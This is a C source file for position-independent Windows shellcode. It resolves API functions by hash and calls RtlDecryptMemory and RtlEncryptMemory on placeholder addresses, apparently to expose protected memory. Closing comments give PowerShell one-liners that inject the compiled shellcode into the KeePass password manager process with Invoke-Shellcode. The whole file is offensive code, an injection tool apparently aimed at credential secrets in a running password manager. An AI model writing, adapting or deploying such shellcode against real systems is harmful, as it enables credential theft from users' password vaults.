#define WIN32_LEAN_AND_MEAN

#pragma warning( disable : 4201 ) // Disable warning about 'nameless struct/union'

#include "GetProcAddressWithHash.h"
#include "64BitHelper.h"
#include <windows.h>
#include <intrin.h>

#define BIND_PORT 4444
#define HTONS(x) ( ( (( (USHORT)(x) ) >> 8 ) & 0xff) | ((( (USHORT)(x) ) & 0xff) << 8) )

// Redefine Win32 function signatures. This is necessary because the output
// of GetProcAddressWithHash is cast as a function pointer. Also, this makes
// working with these functions a joy in Visual Studio with Intellisense.
typedef HMODULE(WINAPI *FuncLoadLibraryA) (
	_In_z_	LPTSTR lpFileName
	);


typedef int (WINAPI *FuncMessageBoxA) (
	_In_opt_ HWND hWnd,
	_In_opt_ LPCSTR lpText,
	_In_opt_ LPCSTR lpCaption,
	_In_ UINT uType);

typedef NTSTATUS(WINAPI *FuncRtlEncryptMemory) (
	_Inout_ PVOID Memory,
	_In_    ULONG MemoryLength,
	_In_    ULONG OptionFlags
	);

typedef NTSTATUS(WINAPI *FuncRtlDecryptMemory) (
	_Inout_ PVOID Memory,
	_In_    ULONG MemoryLength,
	_In_    ULONG OptionFlags
	);

typedef VOID(WINAPI *FuncSleep) (
	_In_ DWORD dwMilliseconds
	);

typedef BOOL(WINAPI *FuncVirtualFree) (
	_In_ LPVOID lpAddress,
	_In_ SIZE_T dwSize,
	_In_ DWORD  dwFreeType
	);

// Write the logic for the primary payload here
// Normally, I would call this 'main' but if you call a function 'main', link.exe requires that you link against the CRT
// Rather, I will pass a linker option of "/ENTRY:ExecutePayload" in order to get around this issue.
VOID ExecutePayload(VOID)
{
	FuncLoadLibraryA MyLoadLibraryA;
	//FuncMessageBoxA MyMessageBoxA;
	FuncRtlEncryptMemory MyRtlEncryptMemory;
	FuncRtlDecryptMemory MyRtlDecryptMemory;
	FuncSleep MySleep;
	FuncVirtualFree MyVirtualFree;

	// Strings must be treated as a char array in order to prevent them from being stored in
	// an .rdata section. In order to maintain position independence, all data must be stored
	// in the same section. Thanks to Nick Harbour for coming up with this technique:
	// http://nickharbour.wordpress.com/2010/07/01/writing-shellcode-with-a-c-compiler/
	//char done[] = { 'D','O','N','E',0 };
	//char user32[] = { 'u', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', 0 };
	char cryptbase[] = { 'c', 'r', 'y', 'p', 't', 'b','a','s','e', '.', 'd', 'l', 'l', 0 };
	//char* addr = (char*)(0x41414141 + (sizeof(char*) * 2));
	ULONG addr = 0x41414141;
	ULONG len = 0x42424242;

	// Initialize structures. SecureZeroMemory is forced inline and doesn't call an external module
	//SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));

#pragma warning( push )
#pragma warning( disable : 4055 ) // Ignore cast warnings

	// Should I be validating that these return a valid address? Yes... Meh.
	MyLoadLibraryA = (FuncLoadLibraryA)GetProcAddressWithHash(0x0726774C);		// We're assumming kernel32 is loaded A.K.A. don't try this in chrome

	// You must call LoadLibrary on modules before attempting to resolve their exports.
	//MyLoadLibraryA((LPTSTR)user32);
	MyLoadLibraryA((LPTSTR)cryptbase);

	//MyMessageBoxA = (FuncMessageBoxA)GetProcAddressWithHash(0x07568345);
	MyRtlEncryptMemory = (FuncRtlEncryptMemory)GetProcAddressWithHash(0x97096893);
	MyRtlDecryptMemory = (FuncRtlDecryptMemory)GetProcAddressWithHash(0x97116893);

	// kernel32
	MySleep = (FuncSleep)GetProcAddressWithHash(0xe035f044);
	MyVirtualFree = (FuncVirtualFree)GetProcAddressWithHash(0x300f2f0b);

#pragma warning( pop )
	// Before
	//MyMessageBoxA(NULL, cryptbase, NULL, 0);

	MyRtlDecryptMemory(addr, len, 0);

	//MyMessageBoxA(NULL, done, NULL, 0);
	MySleep(3000);
	
	//SecureZeroMemory(addr, len);
	MyRtlEncryptMemory(addr, len, 0);		// SecureZeroMemory was causing relocation problems and causing crashes...
	//MyVirtualFree(addr, 0, MEM_RELEASE);	// Also caused crashes when optimization was turned on...
	//MyMessageBoxA(NULL, done, NULL, 0);
}

// $sc = gc -Encoding Byte .\PIC_Bindshell_shellcode.bin;$str='';$sc | %{$str += "0x" + ('{0:X2}' -f $_)+', '};$str | clip
// $sc = gc -Encoding Byte .\PIC_Bindshell_shellcode.bin; Invoke - Shellcode - ProcessID((ps keepass).Id) - Shellcode $sc - Force